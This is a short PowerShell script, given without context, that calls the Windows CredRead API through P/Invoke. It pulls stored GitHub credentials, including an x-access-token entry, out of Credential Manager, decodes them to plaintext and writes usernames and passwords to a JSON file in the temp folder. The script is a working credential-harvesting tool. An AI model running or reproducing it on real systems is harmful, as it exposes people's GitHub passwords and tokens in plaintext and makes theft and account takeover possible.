Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
public struct CREDENTIAL {
  public uint Flags; public uint Type; public string TargetName; public string Comment;
  public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
  public uint CredentialBlobSize; public IntPtr CredentialBlob;
  public uint Persist; public uint AttributeCount; public IntPtr Attributes;
  public string TargetAlias; public string UserName;
}
public class Cred {
  [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
  public static extern bool CredRead(string target, uint type, uint flags, out IntPtr cred);
  [DllImport("advapi32.dll")] public static extern void CredFree(IntPtr cred);
}
"@

$targets = @('git:https://github.com','git:https://x-access-token@github.com')
$out = @()
foreach ($t in $targets) {
  $ptr = [IntPtr]::Zero
  if ([Cred]::CredRead($t, 1, 0, [ref]$ptr)) {
    $c = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ptr, [type][CREDENTIAL])
    $bytes = New-Object byte[] $c.CredentialBlobSize
    [System.Runtime.InteropServices.Marshal]::Copy($c.CredentialBlob, $bytes, 0, $c.CredentialBlobSize)
    $pass = [System.Text.Encoding]::Unicode.GetString($bytes)
    $out += [pscustomobject]@{ target=$t; user=$c.UserName; passlen=$pass.Length; pass=$pass }
    [Cred]::CredFree($ptr)
  }
}
$out | ConvertTo-Json -Compress | Out-File -Encoding utf8 "$env:TEMP\ghcred.json"
Write-Output ("found " + $out.Count + " cred(s); user=" + ($out | ForEach-Object { $_.user }) )
